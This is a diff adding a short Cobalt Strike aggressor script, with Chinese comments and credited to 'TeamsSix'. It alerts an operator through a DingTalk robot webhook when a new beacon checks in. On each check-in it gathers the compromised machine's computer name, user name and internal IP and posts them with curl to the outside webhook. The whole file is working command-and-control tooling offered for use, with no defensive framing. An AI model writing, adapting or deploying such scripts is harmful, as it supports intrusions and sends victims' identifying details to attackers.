@@ -1,0 +1,24 @@
+# author: TeamsSix
+
+# 钉钉机器人配置
+$DingDing_Robot_Token = 'your_token';
+$DingDing_Robot_Url = 'https://oapi.dingtalk.com/robot/send?access_token='.$DingDing_Robot_Token;
+$Notice_Title = 'CS 有主机上线了！';
+
+# 测试
+on ready {
+    @curl_command = @('curl','-H','Content-Type: application/json','-d','{"msgtype": "text","text": {"content": "CS 钉钉机器人添加成功"}}',$DingDing_Robot_Url);
+    exec(@curl_command);
+}
+
+# 上线提醒:
+on beacon_initial {
+    println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1, "pid"));
+    local('$InternalIP $ComputerName $UserName');
+    $InternalIP = replace(beacon_info($1, "internal"), " ", "_");
+    $ComputerName = replace(beacon_info($1, "computer"), " ", "_");
+    $UserName = replace(beacon_info($1, "user"), " ", "_");
+    $Info = '# '.$Notice_Title.'\n\n计算机名称：'.$ComputerName.'\n\n用户名：'.$UserName.'\n\nIP 地址：'.$InternalIP;
+    @curl_command = @('curl','-H','Content-Type: application/json','-d','{"msgtype": "markdown","markdown": {"title":"'.$Notice_Title.'","text": "'.$Info.'"}}',$DingDing_Robot_Url);
+    exec(@curl_command);
+}
